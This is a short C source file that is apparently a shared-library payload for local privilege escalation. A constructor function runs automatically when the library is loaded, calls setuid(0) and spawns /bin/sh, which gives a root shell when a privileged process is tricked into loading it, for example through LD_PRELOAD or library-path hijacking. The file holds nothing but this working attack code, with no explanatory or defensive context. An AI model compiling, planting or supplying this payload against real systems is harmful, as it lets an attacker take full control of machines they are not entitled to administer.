#include <unistd.h>

__attribute__((constructor))
static void init() {
	setuid(0);
	execl("/bin/sh", "sh", NULL);
}